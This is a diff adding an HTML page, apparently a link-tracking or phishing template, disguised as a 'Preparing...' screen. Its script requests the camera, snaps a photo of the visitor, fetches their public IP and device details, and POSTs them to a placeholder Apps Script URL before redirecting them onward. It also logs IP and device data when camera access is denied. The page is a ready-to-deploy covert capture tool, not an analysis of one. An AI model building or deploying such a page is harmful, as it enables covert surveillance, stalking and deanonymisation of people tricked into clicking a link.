@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Preparing...</title>
+  <style>
+    body{font-family:Arial,Helvetica,sans-serif;text-align:center;padding:20px;}
+    video{max-width:100%;border-radius:8px;border:1px solid #ccc;}
+    .status{margin-top:12px;color:#333;}
+  </style>
+</head>
+<body>
+  <h3>Please allow the camera — preparing to capture</h3>
+  <video id="video" autoplay playsinline></video>
+  <div class="status" id="status">Requesting camera access...</div>
+
+<script>
+(async function(){
+  const params = new URLSearchParams(window.location.search);
+  const redirectUrl = params.get('redirect') || params.get('url') || '/';
+  const scriptUrl = "YOUR_SCRIPT_EXEC_URL"; // <<-- replace with your Apps Script /exec URL
+
+  const statusEl = document.getElementById('status');
+
+  function setStatus(t){ statusEl.textContent = t; }
+
+  // get public IP via ipify (fallback to empty string on error)
+  async function getPublicIP(){
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const j = await r.json();
+      return j.ip || '';
+    } catch(e) { return ''; }
+  }
+
+  // try to access camera
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.getElementById('video');
+    video.srcObject = stream;
+    setStatus('Camera active — taking photo in 2s...');
+    await new Promise(r => setTimeout(r, 2000));
+
+    // capture
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataUrl = canvas.toDataURL('image/png');
+
+    // stop camera
+    stream.getTracks().forEach(t => t.stop());
+
+    setStatus('Sending photo to server...');
+
+    const ip = await getPublicIP();
+    const payload = {
+      dataUrl: dataUrl,
+      ip: ip,
+      userAgent: navigator.userAgent || '',
+      deviceInfo: (navigator.platform || '') + ' ' + (navigator.vendor || ''),
+      originalUrl: redirectUrl
+    };
+
+    // POST JSON to Apps Script exec URL
+    const resp = await fetch(scriptUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+
+    // ignore response body but can parse for debugging
+    try { await resp.json(); } catch(e){ /* ignore */ }
+
+    setStatus('Captured. Redirecting...');
+    // small delay so the request completes
+    setTimeout(() => window.location.href = redirectUrl, 400);
+  } catch (err) {
+    // camera denied or error
+    setStatus('Camera not available or permission denied. Logging fallback and redirecting...');
+    // still try to log IP and UA (without photo)
+    const ip = await getPublicIP();
+    const payload = {
+      dataUrl: '', // no photo
+      ip: ip,
+      userAgent: navigator.userAgent || '',
+      deviceInfo: (navigator.platform || '') + ' ' + (navigator.vendor || ''),
+      originalUrl: redirectUrl
+    };
+    try {
+      await fetch(scriptUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch(e){}
+    setTimeout(() => window.location.href = redirectUrl, 500);
+  }
+})();
+</script>
+</body>
+</html>
